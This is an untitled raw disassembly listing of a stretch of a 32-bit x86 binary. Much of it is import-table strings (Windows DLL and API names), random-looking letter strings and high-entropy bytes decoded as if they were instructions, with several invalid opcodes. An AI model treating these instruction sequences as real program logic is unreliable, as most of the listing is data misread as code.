  41490d:	add    BYTE PTR [edx],al
  41490f:	add    BYTE PTR [ebx+0x68],al
  414912:	outs   dx,DWORD PTR ds:[esi]
  414913:	outs   dx,DWORD PTR ds:[esi]
  414914:	jae    0x41497b
  414916:	inc    ebx
  414917:	outs   dx,DWORD PTR ds:[esi]
  414918:	ins    BYTE PTR es:[edi],dx
  414919:	outs   dx,DWORD PTR ds:[esi]
  41491a:	jb     0x414973
  41491c:	add    BYTE PTR [eax],al
  41491e:	or     al,0x0
  414920:	inc    edi
  414921:	gs je  0x41496a
  414924:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656c7469
  41492c:	push   edi
  41492d:	add    BYTE PTR [edi],cl
  41492f:	add    BYTE PTR [edi+0x65],al
  414932:	je     0x414987
  414934:	popa   
  414935:	jbe    0x41499c
  414937:	inc    esi
  414938:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  414940:	add    BYTE PTR [eax],al
  414942:	arpl   WORD PTR [edi+0x6d],bp
  414945:	fs ins BYTE PTR es:[edi],dx
  414947:	xor    esi,DWORD PTR [bp+si]
  41494a:	cs fs ins BYTE PTR es:[edi],dx
  41494d:	ins    BYTE PTR es:[edi],dx
  41494e:	add    BYTE PTR [eax],al
  414950:	inc    esp
  414951:	add    BYTE PTR [eax+0x61],dl
  414954:	je     0x4149be
  414956:	inc    esi
  414957:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  41495f:	jae    0x4149a2
  414961:	add    BYTE PTR [ebx+0x48],dl
  414964:	dec    esp
  414965:	push   edi
  414966:	inc    ecx
  414967:	push   eax
  414968:	dec    ecx
  414969:	cs fs ins BYTE PTR es:[edi],dx
  41496c:	ins    BYTE PTR es:[edi],dx
  41496d:	add    BYTE PTR [ebx+0x70],dh
  414970:	push   ecx
  414971:	dec    edx
  414972:	push   0x47
  414974:	jne    0x4149bc
  414976:	mov    dl,0x4d
  414978:	inc    ecx
  414979:	add    BYTE PTR [edx-0x41ffbeb3],bh
  41497f:	dec    ebx
  414980:	inc    ecx
  414981:	add    bh,ch
  414983:	or     esi,DWORD PTR [edx+0x3a4f710e]
  414989:	dec    edi
  41498a:	ja     0x4149db
  41498c:	cmp    eax,0x304f4f4f
  414991:	dec    edi
  414992:	jb     0x4149e3
  414994:	xor    ecx,DWORD PTR [edi+0x5e]
  414997:	dec    edi
  414998:	ss dec edi
  41499a:	jnp    0x4149eb
  41499c:	sub    DWORD PTR [edi+0x3a],ecx
  41499f:	dec    edi
  4149a0:	sub    cl,BYTE PTR [edi+0x1e]
  4149a3:	push   edx
  4149a4:	pop    ds
  4149a5:	push   ebx
  4149a6:	xor    DWORD PTR [edi+0x71],ecx
  4149a9:	dec    edi
  4149aa:	cmp    cl,BYTE PTR [edi+0x77]
  4149ad:	dec    edi
  4149ae:	cmp    eax,0x304f4f4f
  4149b3:	dec    edi
  4149b4:	jb     0x414a05
  4149b6:	xor    ecx,DWORD PTR [edi+0x5e]
  4149b9:	dec    edi
  4149ba:	ss dec edi
  4149bc:	popa   
  4149bd:	dec    edi
  4149be:	sub    DWORD PTR [edi+0x3a],ecx
  4149c1:	dec    edi
  4149c2:	sub    cl,BYTE PTR [edi+0x1e]
  4149c5:	bound  ebx,QWORD PTR [edi]
  4149c7:	arpl   WORD PTR [ecx],si
  4149c9:	dec    edi
  4149ca:	jno    0x414a1b
  4149cc:	cmp    cl,BYTE PTR [edi+0x6a]
  4149cf:	dec    edi
  4149d0:	cmp    eax,0x314f7b4f
  4149d5:	dec    edi
  4149d6:	dec    esp
  4149d7:	dec    edi
  4149d8:	xor    al,0x4f
  4149da:	cmp    cl,BYTE PTR [edi+0x28]
  4149dd:	dec    edi
  4149de:	push   ds
  4149df:	jb     0x414a00
  4149e1:	jae    0x4149f2
  4149e3:	add    DWORD PTR [eax],0xffffff80
  4149e6:	jo     0x414978
  4149e8:	jno    0x41497b
  4149ea:	aas    
  4149eb:	dec    edi
  4149ec:	jbe    0x414a3d
  4149ee:	cmp    cl,BYTE PTR [edi+0x76]
  4149f1:	dec    edi
  4149f2:	ds dec edi
  4149f4:	dec    esp
  4149f5:	dec    edi
  4149f6:	xor    DWORD PTR [edi+0x7b],ecx
  4149f9:	dec    edi
  4149fa:	xor    eax,0x364f3a4f
  4149ff:	dec    edi
  414a00:	push   ds
  414a01:	sbb    BYTE PTR [edi],0x83
  414a04:	setae  BYTE PTR [eax]
  414a07:	nop
  414a08:	jo     0x4149aa
  414a0a:	jno    0x4149ad
  414a0c:	aas    
  414a0d:	dec    edi
  414a0e:	jbe    0x414a5f
  414a10:	cmp    cl,BYTE PTR [edi+0x76]
  414a13:	dec    edi
  414a14:	ds dec edi
  414a16:	dec    esp
  414a17:	dec    edi
  414a18:	xor    DWORD PTR [edi+0x61],ecx
  414a1b:	dec    edi
  414a1c:	xor    eax,0x364f3a4f
  414a21:	dec    edi
  414a22:	push   ds
  414a23:	xchg   edx,eax
  414a24:	pop    ds
  414a25:	xchg   ebx,eax
  414a26:	bt     DWORD PTR [eax],eax
  414a29:	mov    al,ds:0xb171b070
  414a2e:	aas    
  414a2f:	dec    edi
  414a30:	pusha  
  414a31:	dec    edi
  414a32:	cmp    cl,BYTE PTR [edi+0x4e]
  414a35:	dec    edi
  414a36:	cmp    eax,0x314f7b4f
  414a3b:	dec    edi
  414a3c:	dec    ecx
  414a3d:	dec    edi
  414a3e:	xor    al,0x4f
  414a40:	cmp    cl,BYTE PTR [edi+0x36]
  414a43:	dec    edi
  414a44:	push   ds
  414a45:	mov    ds:0xb30fa31f,al
  414a4a:	add    BYTE PTR [eax-0x3e8e3f90],dh
  414a50:	aas    
  414a51:	dec    edi
  414a52:	pusha  
  414a53:	dec    edi
  414a54:	cmp    cl,BYTE PTR [edi+0x4e]
  414a57:	dec    edi
  414a58:	cmp    eax,0x314f704f
  414a5d:	dec    edi
  414a5e:	pop    edi
  414a5f:	dec    edi
  414a60:	xor    ecx,DWORD PTR [edi+0x3a]
  414a63:	dec    edi
  414a64:	xor    eax,0x1fb21e4f
  414a69:	mov    bl,0xf
  414a6b:	ret    
  414a6c:	add    al,al
  414a6e:	jo     0x414a40
  414a70:	jno    0x414a43
  414a72:	aas    
  414a73:	dec    edi
  414a74:	pusha  
  414a75:	dec    edi
  414a76:	cmp    cl,BYTE PTR [edi+0x4e]
  414a79:	dec    edi
  414a7a:	cmp    eax,0x314f6a4f
  414a7f:	dec    edi
  414a80:	dec    esi
  414a81:	dec    edi
  414a82:	xor    al,0x4f
  414a84:	cmp    cl,BYTE PTR [edi+0x28]
  414a87:	dec    edi
  414a88:	push   ds
  414a89:	ret    0xc31f
  414a8c:	psrlq  mm0,QWORD PTR [eax]
  414a8f:	shl    BYTE PTR [eax-0x20],1
  414a92:	jno    0x414a75
  414a94:	aas    
  414a95:	dec    edi
  414a96:	pusha  
  414a97:	dec    edi
  414a98:	cmp    cl,BYTE PTR [edi+0x4e]
  414a9b:	dec    edi
  414a9c:	cmp    eax,0x314f6b4f
  414aa1:	dec    edi
  414aa2:	dec    esp
  414aa3:	dec    edi
  414aa4:	xor    al,0x4f
  414aa6:	cmp    cl,BYTE PTR [edi+0x36]
  414aa9:	dec    edi
  414aaa:	push   ds
  414aab:	rcr    BYTE PTR [edi],cl
  414aad:	ror    DWORD PTR [edi],cl
  414aaf:	jecxz  0x414ab1
  414ab1:	loopne 0x414b23
  414ab3:	lock jno 0x414aa7
  414ab6:	aas    
  414ab7:	dec    edi
  414ab8:	ins    DWORD PTR es:[edi],dx
  414ab9:	dec    edi
  414aba:	cmp    cl,BYTE PTR [edi+0x5f]
  414abd:	dec    edi
  414abe:	cmp    eax,0x3e4f4a4f
  414ac3:	dec    edi
  414ac4:	cmp    cl,BYTE PTR [edi+0x3f]
  414ac7:	dec    edi
  414ac8:	push   ds
  414ac9:	loop   0x414aea
  414acb:	jecxz  0x414adc
  414acd:	repz add al,dh
  414ad0:	jo     0x414ad2
  414ad2:	jno    0x414ad5
  414ad4:	jo     0x414ae6
  414ad6:	jno    0x414ae9
  414ad8:	ds dec edi
  414ada:	jg     0x414b2b
  414adc:	cmp    cl,BYTE PTR [edi+0x53]
  414adf:	dec    edi
  414ae0:	cmp    al,0x4f
  414ae2:	push   0x4f
  414ae4:	ds dec edi
  414ae6:	dec    ebp
  414ae7:	dec    edi
  414ae8:	xor    ecx,DWORD PTR [edi+0x3a]
  414aeb:	dec    edi
  414aec:	xor    eax,0x1f021e4f
  414af1:	add    ecx,DWORD PTR [edi]
  414af3:	adc    eax,DWORD PTR [eax]
  414af5:	adc    BYTE PTR [eax+0x20],dh
  414af8:	jno    0x414b1b
  414afa:	aas    
  414afb:	dec    edi
  414afc:	add    BYTE PTR [eax],al
  414afe:	xchg   BYTE PTR [ecx+0x41],cl
  414b01:	add    BYTE PTR [edx+0x4b],bh
  414b04:	inc    ecx
  414b05:	add    BYTE PTR [edx-0x41ffbeb5],al
  414b0b:	dec    ebp
  414b0c:	inc    ecx
  414b0d:	add    BYTE PTR [esi],ah
  414b0f:	dec    ebp
  414b10:	inc    ecx
  414b11:	add    BYTE PTR [esi+0x6200414d],ch
  414b17:	dec    ebx
  414b18:	inc    ecx
  414b19:	add    BYTE PTR [esi+0x4b],ah
  414b1c:	inc    ecx
  414b1d:	add    BYTE PTR [esi-0x35ffbeb3],ah
  414b23:	dec    ebx
  414b24:	inc    ecx
  414b25:	add    BYTE PTR [ecx-0x49076357],dh
  414b2b:	mov    edx,0x4b7ef89c
  414b30:	inc    ecx
  414b31:	add    dh,bl
  414b33:	dec    esp
  414b34:	inc    ecx
  414b35:	add    dl,dh
  414b37:	dec    esp
  414b38:	inc    ecx
  414b39:	add    dh,bh
  414b3b:	dec    esp
  414b3c:	inc    ecx
  414b3d:	add    BYTE PTR [esi],cl
  414b3f:	dec    ebp
  414b40:	inc    ecx
  414b41:	add    BYTE PTR [esi-0x7dffbeb5],dh
  414b47:	dec    ecx
  414b48:	inc    ecx
  414b49:	add    dh,dl
  414b4b:	dec    ebx
  414b4c:	inc    ecx
  414b4d:	add    dh,al
  414b4f:	dec    ebx
  414b50:	inc    ecx
  414b51:	add    dl,al
  414b53:	dec    ebp
  414b54:	inc    ecx
  414b55:	add    BYTE PTR [esi],dh
  414b57:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  414b5e:	mov    cl,BYTE PTR [ebx+0x41]
  414b61:	add    BYTE PTR [eax-0x737ee9e4],bl
  414b67:	or     eax,0x705
  414b6c:	inc    eax
  414b6d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  414b71:	fstp   QWORD PTR [ebx+0x45]
  414b74:	inc    ebx
  414b75:	add    BYTE PTR [edx+0x68],dh
  414b78:	inc    ebp
  414b79:	inc    ecx
  414b7a:	mov    edx,?
  414b7c:	jne    0x414be0
  414b7e:	mov    ebp,gs
  414b80:	inc    BYTE PTR [edi]
  414b82:	mov    edi,0x7205a3fa
  414b87:	dec    ebx
  414b88:	inc    ecx
  414b89:	add    BYTE PTR [ecx],bh
  414b8b:	xchg   ebp,eax
  414b8c:	pushf  
  414b8d:	clc    
  414b8e:	cmp    DWORD PTR [esi-0x6ac70764],edx
  414b94:	pushf  
  414b95:	clc    
  414b96:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  414b9c:	pushf  
  414b9d:	clc    
  414b9e:	cmp    eax,0x3cf89c95
  414ba3:	xchg   ebp,eax
  414ba4:	pushf  
  414ba5:	clc    
  414ba6:	aas    
  414ba7:	xchg   ebp,eax
  414ba8:	pushf  
  414ba9:	clc    
  414baa:	ds xchg ebp,eax
  414bac:	pushf  
  414bad:	clc    
  414bae:	and    DWORD PTR [ebp-0x6ad90764],edx
  414bb4:	pushf  
  414bb5:	clc    
  414bb6:	jmp    0x4149:0x7a6003f9
  414bbd:	add    BYTE PTR [eax+edx*1],dh
  414bc0:	inc    ebx
  414bc1:	add    BYTE PTR [ecx+0x49],bl
  414bc4:	imul   si,WORD PTR [esi],0xff85
  414bc8:	pushf  
  414bc9:	clc    
  414bca:	popf   
  414bcb:	jmp    0xac75320
  414bd0:	add    BYTE PTR [eax],al
  414bd2:	jbe    0x414c1d
  414bd4:	inc    ecx
  414bd5:	add    BYTE PTR [ebx+0xe040b],bl
	...
  414c0b:	adc    BYTE PTR [eax+0x0],al
  414c0e:	pop    eax
  414c0f:	and    BYTE PTR [ebx+0x0],al
  414c12:	add    BYTE PTR [eax],al
  414c14:	add    BYTE PTR [eax],al
  414c16:	dec    ecx
  414c17:	add    BYTE PTR [eax+eax*1+0x69],al
  414c1b:	add    BYTE PTR [eax+eax*1+0x4b],ah
  414c1f:	add    BYTE PTR [edx+0x0],cl
  414c22:	dec    ebx
  414c23:	add    BYTE PTR [edx+0x0],cl
  414c26:	inc    esp
  414c27:	add    BYTE PTR [ebx+0x0],ch
  414c2a:	ins    BYTE PTR es:[edi],dx
  414c2b:	add    BYTE PTR [edx+0x0],ch
  414c2e:	inc    esp
  414c2f:	add    BYTE PTR [eax+eax*1+0x49],cl
  414c33:	add    BYTE PTR [eax+eax*1+0x4c],al
  414c37:	add    BYTE PTR [ecx+0x0],cl
  414c3a:	push   ebp
  414c3b:	add    BYTE PTR [edx+0x0],cl
  414c3e:	dec    ebx
  414c3f:	add    BYTE PTR [eax+eax*1+0x4c],al
  414c43:	add    BYTE PTR [edx+0x0],cl
  414c46:	dec    ebx
  414c47:	add    BYTE PTR [eax+0x0],cl
  414c4a:	inc    esp
  414c4b:	add    BYTE PTR [edx+0x0],cl
	...
  414c56:	imul   ebp,DWORD PTR fs:[edx+0x73],0x6b
  414c5b:	ins    BYTE PTR es:[edi],dx
  414c5c:	popa   
  414c5d:	imul   ebp,DWORD PTR [edx+ebp*2+0x4c],0x4b
  414c62:	dec    ecx
  414c63:	dec    edx
  414c64:	inc    esp
  414c65:	inc    esi
  414c66:	ins    BYTE PTR es:[edi],dx
  414c67:	imul   ebp,DWORD PTR [ebx+0x75],0x736c6466
  414c6e:	imul   ebp,DWORD PTR [ecx+0x68],0x67
  414c72:	ins    BYTE PTR es:[edi],dx
  414c73:	jae    0x414ce0
  414c75:	push   0x66
  414c77:	ins    BYTE PTR es:[edi],dx
  414c78:	imul   ecx,DWORD PTR [edx+0x4b],0x44
  414c7c:	imul   sp,WORD PTR [esi+eiz*2+0x68],0x73
  414c82:	imul   esp,DWORD PTR [edi+0x66],0x68
  414c86:	jae    0x414cec
  414c88:	imul   esi,DWORD PTR [ebp+0x6b],0x64756679
  414c8f:	imul   esi,DWORD PTR [ebx+0x6b],0x486a6b68
  414c96:	dec    ebx
  414c97:	dec    edx
  414c98:	inc    esp
  414c99:	inc    esi
  414c9a:	push   0x756b7364
  414c9f:	outs   dx,DWORD PTR ds:[si]
  414ca1:	imul   esi,DWORD PTR [ebx+0x66],0x6b677564
  414ca8:	push   0x66
  414caa:	fs jae 0x414d15
  414cad:	imul   ebp,DWORD PTR [si+0x66],0x68
  414cb2:	ins    BYTE PTR es:[edi],dx
  414cb3:	imul   esp,DWORD PTR [edi+0x6a],0x75
  414cb7:	push   0x6a6b6466
  414cbc:	jne    0x414d25
  414cbe:	jns    0x414d24
  414cc0:	imul   si,WORD PTR [di+0x66],0x6764
  414cc7:	jne    0x414d35
  414cc9:	fs pushw 0x6c67
  414cce:	push   0x68
  414cd0:	data16 add BYTE PTR fs:[eax],al
  414cd4:	add    BYTE PTR [eax],al
  414cd6:	add    BYTE PTR [eax],al
  414cd8:	add    BYTE PTR [eax],al
  414cda:	xor    edx,DWORD PTR [ebx]
  414cdc:	inc    ecx
  414cdd:	add    BYTE PTR [ebp+0x4f],dl
  414ce0:	pop    edi
  414ce1:	dec    edi
  414ce2:	dec    esp
  414ce3:	dec    edi
  414ce4:	dec    eax
  414ce5:	dec    edi
  414ce6:	pop    edi
  414ce7:	dec    edi
  414ce8:	push   esi
  414ce9:	dec    edi
  414cea:	or     eax,0x3a4f0c4f
  414cef:	dec    edi
  414cf0:	add    BYTE PTR [eax],al
  414cf2:	push   ecx
  414cf3:	dec    edi
  414cf4:	pop    esi
  414cf5:	dec    edi
  414cf6:	push   ebx
  414cf7:	dec    edi
  414cf8:	or     eax,0x3a4f0c4f
  414cfd:	dec    edi
  414cfe:	dec    edi
  414cff:	dec    edi
  414d00:	dec    ebp
  414d01:	dec    edi
  414d02:	pop    edi
  414d03:	dec    edi
  414d04:	dec    esp
  414d05:	dec    edi
  414d06:	or     eax,0x3a4f0c4f
  414d0b:	dec    edi
  414d0c:	add    BYTE PTR [eax],al
  414d0e:	dec    ebp
  414d0f:	dec    edi
  414d10:	push   edx
  414d11:	dec    edi
  414d12:	push   esi
  414d13:	dec    edi
  414d14:	inc    ecx
  414d15:	dec    edi
  414d16:	pop    ebx
  414d17:	dec    edi
  414d18:	dec    edx
  414d19:	dec    edi
  414d1a:	push   ebx
  414d1b:	dec    edi
  414d1c:	cmp    cl,BYTE PTR [edi+0x0]
  414d1f:	add    BYTE PTR [eax],al
  414d21:	add    BYTE PTR [eax],al
  414d23:	add    BYTE PTR [eax],al
  414d25:	add    BYTE PTR [esi+0x7d],ch
  414d28:	outs   dx,BYTE PTR ds:[esi]
  414d29:	lea    ebp,[esi-0x63]
  414d2c:	outs   dx,BYTE PTR ds:[esi]
  414d2d:	lods   eax,DWORD PTR ds:[esi]
  414d2e:	outs   dx,BYTE PTR ds:[esi]
  414d2f:	mov    ebp,0xdd6ecd6e
  414d34:	outs   dx,BYTE PTR ds:[esi]
  414d35:	in     eax,dx
  414d36:	outs   dx,BYTE PTR ds:[esi]
  414d37:	std    
  414d38:	outs   dx,BYTE PTR ds:[esi]
  414d39:	or     eax,0x2d6e1d6e
  414d3e:	outs   dx,BYTE PTR ds:[esi]
  414d3f:	cmp    eax,0x6d6e5d6e
  414d44:	outs   dx,BYTE PTR ds:[esi]
  414d45:	jb     0x414db5
  414d47:	jae    0x414db7
  414d49:	jo     0x414db9
  414d4b:	jno    0x414dbb
  414d4d:	jbe    0x414dbd
  414d4f:	ja     0x414dbf
  414d51:	je     0x414dc1
  414d53:	jne    0x414dc3
  414d55:	mov    ch,BYTE PTR [esi-0x75]
  414d58:	outs   dx,BYTE PTR ds:[esi]
  414d59:	mov    BYTE PTR [esi-0x77],ch
  414d5c:	outs   dx,BYTE PTR ds:[esi]
  414d5d:	mov    gs,WORD PTR [esi+0x7c]
  414d60:	pop    esi
  414d61:	jge    0x414db1
  414d63:	jge    0x414d23
  414d65:	jge    0x414db7
  414d67:	(bad)  
  414d68:	jno    0x414dda
  414d6a:	mov    cl,0xb1
  414d6c:	outs   dx,BYTE PTR ds:[esi]
  414d6d:	jae    0x414dec
  414d6f:	bound  esp,QWORD PTR [edx+0x7c265fc6]
  414d75:	add    BYTE PTR [ecx+0x17],al
  414d78:	mov    bl,0x56
  414d7a:	mov    cl,0xf4
  414d7c:	inc    edx
  414d7d:	aaa    
  414d7e:	inc    edx
  414d7f:	jle    0x414d12
  414d81:	jno    0x414ddb
  414d83:	mov    cl,0x4
  414d85:	imul   esp,DWORD PTR [eax-0x70282bf8],0x5
  414d8c:	inc    esp
  414d8d:	xlat   BYTE PTR ds:[ebx]
  414d8e:	leave  
  414d8f:	xchg   ebx,eax
  414d90:	inc    eax
  414d91:	adc    eax,ecx
  414d93:	jge    0x414d60
  414d95:	faddp  st(7),st
  414d97:	leave  
  414d98:	xchg   BYTE PTR [esi+0x1fa23208],ah
  414d9e:	fs icebp 
  414da0:	dec    eax
  414da1:	(bad)  
  414da2:	leave  
  414da3:	sbb    cl,cl
  414da5:	jno    0x414d93
  414da7:	(bad)  [ebx+0x7]
  414daa:	ror    BYTE PTR [ebx+0x41],cl
  414dad:	add    BYTE PTR [ebp+0x2f],al
  414db0:	shl    BYTE PTR [edx],0x2c
  414db3:	xor    eax,DWORD PTR [ecx+0x0]
  414db6:	inc    esi
  414db7:	push   ebx
  414db8:	outs   dx,DWORD PTR ds:[esi]
  414db9:	push   ebx
  414dba:	push   0x4b
  414dbc:	inc    ecx
  414dbd:	add    dh,cl
  414dbf:	dec    ebx
  414dc0:	inc    ecx
  414dc1:	add    BYTE PTR [ebp+ebp*8+0x712],cl
	...
  414de4:	add    BYTE PTR [eax],al
  414de6:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  414ded:	pop    ecx
  414dee:	outs   dx,BYTE PTR ds:[esi]
  414def:	jbe    0x414e69
  414df1:	jns    0x414e47
  414df3:	push   ecx
  414df4:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  414df8:	je     0x414e5b
	...
  414e0e:	jp     0x414e64
  414e10:	arpl   WORD PTR [ecx+0x4b],cx
  414e13:	push   edx
  414e14:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  414e1b:	push   0x66495949
  414e20:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  414e24:	push   esi
  414e25:	jb     0x414e8f
  414e27:	add    BYTE PTR [ebx+0x51],al
  414e2a:	ins    BYTE PTR es:[edi],dx
  414e2b:	pop    eax
  414e2c:	ja     0x414e7b
  414e2e:	je     0x414ea6
  414e30:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  414e34:	in     al,0xf5
  414e36:	jnp    0x414e86
  414e38:	jnp    0x414e08
  414e3a:	cmc    
  414e3b:	push   DWORD PTR [ebx]
  414e3d:	sar    ebx,cl
  414e3f:	fst    DWORD PTR [edi+0x43]
  414e42:	shr    BYTE PTR ds:0xe58c,0xf6
  414e49:	add    BYTE PTR [eax],al
  414e4b:	add    BYTE PTR [edx+eiz*8],cl
  414e4e:	icebp  
  414e4f:	push   ds
  414e50:	in     al,dx
  414e51:	aas    
  414e52:	pop    edx
  414e53:	xchg   ecx,eax
  414e54:	fst    DWORD PTR [ecx-0xaf4634f]
  414e5a:	xchg   edi,eax
  414e5b:	call   0x505f:0x6b2244e2
  414e62:	jle    0x414e45
  414e64:	(bad)  
  414e65:	and    esi,ecx
  414e67:	sbb    al,0x18
  414e69:	imul   ebx,DWORD PTR [edx-0x3c4bea78],0x2b
  414e70:	pop    esp
  414e72:	nop
  414e73:	fsubr  QWORD PTR [edx+esi*1-0x1f]
  414e77:	mov    eax,0xf14a1555
  414e7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e7d:	and    BYTE PTR [ebx],al
  414e7f:	jg     0x414ef9
  414e81:	rol    BYTE PTR [ebx+0x40],cl
  414e84:	mov    ds:0x5976686c,eax
  414e89:	rcr    BYTE PTR [edi-0x7d],1
  414e8c:	ds cmp ebx,eax
  414e8f:	push   ds
  414e90:	pop    ds
  414e91:	jb     0x414f0c
  414e93:	test   DWORD PTR [eax],edx
  414e95:	push   ebx
  414e96:	aas    
  414e97:	cmp    BYTE PTR [ecx],dh
  414e99:	mov    ebx,0x197a9427
  414e9e:	mov    al,0xf3
  414ea0:	push   ds
  414ea1:	add    al,0x3a
  414ea3:	pop    ds
  414ea4:	sub    BYTE PTR [esp+ebx*2+0x34],bl
  414ea8:	ss ins BYTE PTR es:[edi],dx
  414eaa:	fild   QWORD PTR [eax]
  414eac:	loope  0x414f0f
  414eae:	lahf   
  414eaf:	aad    0xf3
  414eb1:	shl    DWORD PTR [ebx+esi*2+0x6f],1
  414eb5:	cmp    eax,0x94e8c29e
  414eba:	sti    
  414ebb:	rol    BYTE PTR ss:[esi-0x7c64a19c],1
  414ec2:	adc    BYTE PTR [eax+esi*4-0x586033c7],0xd7
  414eca:	sub    eax,ebp
  414ecc:	or     eax,0x8f1fe41c
  414ed1:	pop    edi
  414ed2:	push   ds
  414ed3:	cwde   
  414ed4:	cs or  ah,ch
  414ed7:	sbb    DWORD PTR [edx-0x46771458],edi
  414edd:	pusha  
  414ede:	and    BYTE PTR [ecx-0x176846bd],dh
  414ee4:	mov    ebx,0xffa6d1ec
  414ee9:	sub    DWORD PTR [esi],0xcda5e24d
  414eef:	imul   edx,DWORD PTR [ebx],0x59900bbb
  414ef5:	push   0x3e
  414ef7:	or     DWORD PTR [esi+0x46318a5b],0x32768765
  414f01:	mov    dh,0x8d
  414f03:	mov    ds:0x42f8462e,eax
  414f08:	mov    dh,0x8d
  414f0a:	sub    al,0xee
  414f0c:	repnz mov ah,0x16
  414f0f:	(bad)  
  414f10:	aam    0x1f
  414f12:	test   BYTE PTR [esi],bl
  414f14:	cmp    ebx,DWORD PTR [esp+edi*2]
  414f17:	cmc    
  414f18:	and    eax,0xd04d18f
  414f1d:	repz pop ecx
  414f1f:	fimul  WORD PTR [eax-0x67]
  414f22:	xchg   BYTE PTR [edi+ebx*2-0x41],bh
  414f26:	fsub   DWORD PTR [eax-0x3ed26287]
  414f2c:	daa    
  414f2d:	xor    ah,BYTE PTR [ecx-0x2fe613a6]
  414f33:	cmp    eax,0xbc423b8
  414f38:	push   0xffffffbb
  414f3a:	xor    edi,ebp
  414f3c:	shl    BYTE PTR [ecx+eax*4+0x1850a1],0x0
	...
  414fb4:	pop    edx
  414fb5:	ficom  DWORD PTR [esi+0x60]
  414fb8:	(bad)  
  414fb9:	in     al,dx
  414fba:	jle    0x414fb6
  414fbc:	cs pop ebx
  414fbe:	pop    ss
  414fbf:	ret    0x4494
  414fc2:	into   
  414fc3:	mov    ebx,0xe682
  414fc8:	test   BYTE PTR [eax],0x0
  414fcb:	add    al,ch
  414fcd:	popf   
  414fce:	mov    ds:0xa194a82d,al
  414fd3:	cmp    ebx,eax
  414fd5:	lods   eax,DWORD PTR ds:[esi]
  414fd6:	shl    BYTE PTR [ecx+0x2c8f3dbd],0xc8
  414fdd:	cmp    eax,0xc215b66
  414fe2:	cmp    DWORD PTR [ebx-0x12],eax
  414fe5:	out    dx,eax
  414fe6:	cmp    DWORD PTR [ebx+0x6a],esi
  414fe9:	ins    DWORD PTR es:[edi],dx
  414fea:	lods   eax,DWORD PTR ds:[esi]
  414feb:	sar    DWORD PTR [ecx],0xc6
  414fee:	(bad)  [esi+0x59]
  414ff1:	out    0x82,al
  414ff3:	pop    esi
  414ff4:	inc    edi
  414ff5:	in     al,0xfa
  414ff7:	mov    BYTE PTR [eax],cl
  414ff9:	enter  0x8635,0x9e
  414ffd:	inc    ebp
  414ffe:	fnstsw WORD PTR [edi+ebp*1]
  415001:	mov    es,WORD PTR [ecx-0x37e2691f]
  415007:	xor    BYTE PTR [edx],dh
  415009:	ins    DWORD PTR es:[edi],dx
  41500a:	jnp    0x414f8d
  41500c:	add    esp,DWORD PTR [esi-0x47]
  41500f:	arpl   WORD PTR [ebx+ebx*8-0x284a29e3],cx
  415016:	push   ebp
  415017:	adc    al,0xca
  415019:	(bad)  
  41501a:	sbb    eax,0x318be41f
  41501f:	dec    edi
  415020:	rcl    BYTE PTR [ecx-0x33],cl
  415023:	mov    dl,dh
  415025:	and    eax,0x3eb464d
  41502a:	jecxz  0x41506a
  41502c:	repnz jmp 0x13e3:0x27252609
  415034:	sub    DWORD PTR [edi],ebp
  415036:	jmp    DWORD PTR [eax]
  415038:	into   
  415039:	dec    ecx
  41503a:	outs   dx,DWORD PTR ds:[esi]
  41503b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41503c:	mov    dh,0x28
  41503e:	or     al,BYTE PTR [ebp-0x55bd5a77]
  415044:	fwait
  415045:	pop    eax
  415046:	or     DWORD PTR [esi-0x5794c33b],edi
  41504c:	and    DWORD PTR [ebp+0x6],0x0
  415050:	mov    al,ds:0x6dd935bf
  415055:	jl     0x41507a
  415057:	ds dec esp
  415059:	or     BYTE PTR ds:0x4d79d268,ch
  41505f:	jb     0x41500b
  415061:	inc    ebp
  415062:	das    
  415063:	xchg   edi,eax
  415064:	and    eax,0x2f2782b9
  415069:	and    DWORD PTR [ecx+0xb3e80f7],ebp
  41506f:	in     al,0xcd
  415071:	pushw  ss
  415073:	jecxz  0x4150b5
  415075:	adc    BYTE PTR [edi+0x20],0x2e
  415079:	pop    ebp
  41507a:	into   
  41507b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41507c:	adc    DWORD PTR [edi+0x1],0x78
  415080:	aas    
  415081:	es popf 
  415083:	in     eax,0xe0
  415085:	inc    edi
  415086:	push   es
  415087:	push   edx
  415088:	popf   
  415089:	imul   ebx,DWORD PTR [edx+0x57e0e8c9],0xa9716d11
  415093:	sti    
  415094:	push   eax
  415095:	jnp    0x41506f
  415097:	cmp    eax,0x90422817
  41509c:	xchg   esp,eax
  41509d:	mov    esp,0xa8a6eb7d
  4150a2:	aas    
  4150a3:	shl    BYTE PTR [ecx],1
  4150a5:	int3   
  4150a6:	call   0x388e1ad6
  4150ab:	inc    eax
  4150ac:	xor    BYTE PTR ds:0xb33180e3,ch
  4150b2:	push   edx
  4150b3:	cmp    cl,BYTE PTR [ebx-0x31370224]
  4150b9:	pop    edx
  4150ba:	push   esp
  4150bb:	dec    edx
  4150bc:	imul   eax,edx,0xfffffff4
  4150bf:	ins    BYTE PTR es:[edi],dx
  4150c0:	sbb    ebx,esi
	...
  415132:	add    BYTE PTR [eax],al
  415134:	add    dl,BYTE PTR [edx]
  415136:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  41513c:	adc    ah,BYTE PTR [esi-0x1adc3b27]
  415142:	retf   0x781e
  415145:	out    0x0,eax
  415147:	add    dh,dh
  415149:	add    BYTE PTR [eax],al
  41514b:	add    dl,bh
  41514d:	stos   DWORD PTR es:[edi],eax
  41514e:	mov    dl,0x7a
  415150:	jl     0x415137
  415152:	mov    dh,0xd5
  415154:	adc    DWORD PTR [edi+0x31],ebp
  415157:	xor    dl,0xd7
  41515a:	fadd   QWORD PTR [ebp+0x4f]
  41515d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41515e:	(bad)  
  41515f:	jl     0x415178
  415161:	test   eax,0x7f73648e
